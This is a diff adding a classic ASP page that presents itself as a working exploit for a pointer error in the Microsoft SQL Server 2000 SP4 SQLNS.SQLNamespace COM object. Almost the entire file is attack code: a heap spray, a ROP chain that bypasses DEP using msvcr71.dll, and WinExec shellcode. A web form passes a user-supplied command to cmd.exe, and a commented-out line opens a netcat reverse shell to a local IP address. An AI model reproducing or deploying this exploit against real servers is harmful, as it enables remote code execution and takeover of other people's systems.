@@ -1,0 +1,145 @@
+<%
+Function Padding(intLen)
+	Dim strRet, intSize
+	intSize = intLen/2 - 1
+	For I = 0 To intSize Step 1
+		strRet = strRet & unescape("%u4141")
+	Next
+	Padding = strRet
+End Function
+
+Function PackDWORD(strPoint)
+	strTmp = replace(strPoint, "0x", "")
+	PackDWORD = PackDWORD & UnEscape("%u" & Mid(strTmp, 5, 2) & Mid(strTmp, 7, 2))
+	PackDWORD = PackDWORD & UnEscape("%u" & Mid(strTmp, 1, 2) & Mid(strTmp, 3, 2))
+End Function
+
+Function PackList(arrList)
+	For Each Item In arrList
+		PackList = PackList & PackDWORD(Item)
+	Next
+End Function
+
+Function PackShellcode(strCode)
+	intLen = Len(strCode) / 4
+	If intLen Mod 2 = 1 Then
+		strCode = strCode & "\x90"
+		intLen = intLen + 1
+	End If
+	arrTmp = Split(strCode, "\x")
+	For I = 1 To UBound(arrTmp) Step 2
+		PackShellcode = PackShellcode & UnEscape("%u" & arrTmp(I + 1) & arrTmp(I))
+	Next
+End Function
+
+Function UnicodeToAscii(uStrIn)
+	intLen = Len(strCommand)
+	If intLen Mod 2 = 1 Then
+		For I = 1 To intLen - 1 Step 2
+			UnicodeToAscii = UnicodeToAscii & "%u" & Hex(Asc(Mid(strCommand, I + 1, 1))) & Hex(Asc(Mid(strCommand, I, 1)))
+		Next
+		UnicodeToAscii = UnicodeToAscii & "%u00" & Hex(Asc(Mid(strCommand, I, 1)))
+	Else
+		For I = 1 To intLen - 1 Step 2
+			UnicodeToAscii = UnicodeToAscii & "%u" & Hex(Asc(Mid(strCommand, I + 1, 1))) & Hex(Asc(Mid(strCommand, I, 1)))
+		Next
+	End If
+	UnicodeToAscii = UnEscape(UnicodeToAscii & "%u0000%u0000")
+End Function
+
+'''''''''''''''''''''''''''''bypass DEP with [msvcr71.dll] 92 bytes
+Rop_Chain = Array(_
+"0x41414141", _
+"0x7c373ab6", _
+"0x7c3425bc", _
+"0x7c376fc5", _
+"0x7c343423", _
+"0x7c3415a2", _
+"0x7c373ab6", _
+"0x41414141", _
+"0x41414141", _
+"0x41414141", _
+"0x41414141", _
+"0x7c344dbe", _
+"0x7c376fc5", _
+"0x7c373ab6", _
+"0x7c373ab6", _
+"0x7c351cc5", _
+"0x7c3912a3", _
+"0x7c3427e5", _
+"0x7c346c0b", _
+"0x7c3590be", _
+"0x7c37a151", _
+"0x7c378c81", _
+"0x7c345c30"  _
+)
+Small_Shellcode = "\x64\x8B\x25\x00\x00\x00\x00\xeb\x07\x90\x90\x90"
+'0C0C0C6C   64:8B25 00000000          MOV ESP,DWORD PTR FS:[0]
+'0C0C0C73   EB 07                     JMP SHORT 0C0C0C7C
+'0C0C0C75   90                        NOP
+'0C0C0C76   90                        NOP
+'0C0C0C77   90                        NOP
+'12 bytes
+Fix_ESP = "\x83\xEC\x24\x8B\xEC\x83\xC5\x30"
+'0C0C0C7C   83EC 24                   SUB ESP,24
+'0C0C0C7F   8BEC                      MOV EBP,ESP
+'0C0C0C81   83C5 30                   ADD EBP,30
+'8 bytes
+'''''''''''''''''''''''''''''shellcode WinExec (win2k sp2)
+Real_Shellcode = "\xd9\xee\x9b\xd9\x74\x24\xf4\x5e\x83\xc6\x1a\x33\xc0\x50\x56\x68\x41\x41\x41\x41\x68\x16\x41\x86\x7c\xc3"
+'D9EE            FLDZ
+'9B              WAIT
+'D97424 F4       FSTENV (28-BYTE) PTR SS:[ESP-C]
+'5E              POP ESI
+'83C6 1a                   ADD ESI,1a
+'33C0                      XOR EAX,EAX
+'50                        PUSH EAX
+'56                        PUSH ESI
+'68 F1F8807C               PUSH kernel32.ExitThread
+'68 1641867C               PUSH kernel32.WinExec
+'C3                        RETN
+'''''''''''''''''''''''''''''main
+Dim strCmd
+
+strCmd = Request("cmd")
+strCommand = "cmd.exe /q /c " & strCmd
+'strCommand = "C:\Inetpub\wwwroot\nc.exe -e cmd.exe 192.168.194.1 8080"
+
+strOpcode = PackShellcode(Real_Shellcode) & UnicodeToAscii(strCommand)
+intOpcode = Len(strOpcode)
+
+Payload = String((1000/2), UnEscape("%u4141")) & PackDWORD("0x0c0c0c0c") & PackList(Rop_Chain) & PackShellcode(Small_Shellcode) & PackDWORD("0x5a64f0fe") &_
+PackShellcode(Fix_ESP) & strOpcode &_
+Padding(928 - intOpcode*2)
+'Response.Write Len(Payload)
+Dim Block
+For N = 1 to 512
+	Block = Block & Payload
+Next
+Dim spary()
+For I = 0 To 200 Step 1
+	Redim Preserve spary(I)
+	spary(I) = Block
+Next
+
+If strCmd = "" Then
+	Response.Write "Please Input command! <br />"
+Else
+	Set obj = CreateObject("SQLNS.SQLNamespace")
+	Response.Write "Try to Execute: " & strCommand
+	arg1 = 202116108 '0x0c0c0c0c
+	obj.Refresh arg1
+End If
+%>
+<html><head><title>Microsoft SQL Server 2000 SP4 SQLNS.SQLNamespace COM object Refresh() Pointer Error Exploit(DEP bypass)</title>
+<body>
+<p>
+Microsoft SQL Server 2000 SP4 SQLNS.SQLNamespace COM object Refresh() Pointer Error Exploit(DEP bypass) <br />
+Other version not test :) <br />
+Bug found and Exploit by ylbhz@hotmail.com At 2012/04/03<br />
+</P>
+
+<form action="" method="post">
+Program to Execute:<input type="text" value="<%=strCmd%>"size=120 name="cmd"></input><input type="submit" value="Exploit">
+</form>
+</form>
